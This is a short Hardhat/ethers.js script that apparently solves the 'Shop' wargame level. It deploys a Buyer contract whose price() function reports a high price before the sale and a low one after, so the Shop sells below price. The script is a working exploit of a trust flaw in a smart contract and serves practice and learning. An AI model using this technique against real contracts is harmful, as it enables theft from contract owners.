const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x19C9957E4ba8271b79b341E7Ee34Fd73A62b9632'
const abi = [
    "function price() public view returns (uint256)",
    "function isSold() public view returns (bool)"
]

async function hack(contract, signer) {
    // We need to create the transaction from a buyer contract that has a price() function.
    // Fortunately, we can code the price() function to do whatever we want.
    // We can't update state from it, but we can use the state of the Shop contract to determine the price.
    // We want the price to be high when isSold = false and low when isSold = true, so we code that in.
    const BuyerContract = await ethers.getContractFactory('Buyer')
    const buyerContract = await BuyerContract.deploy(contract.address)
    await buyerContract.deployed()
    console.log(`Buyer Contract Deployed To: ${buyerContract.address}`)

    // Now all that's left is to call our contract.
    const buyerABI = ["function buyFromShop() public"]
    const buyer = new ethers.Contract(buyerContract.address, buyerABI, signer)
    const tx = await buyer.buyFromShop()
    await tx.wait()

    // Confirm that everything worked.
    const price = await contract.price()
    const isSold = await contract.isSold()
    console.log(`Sold? ${isSold}`)
    console.log(`Price: ${price}`)
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})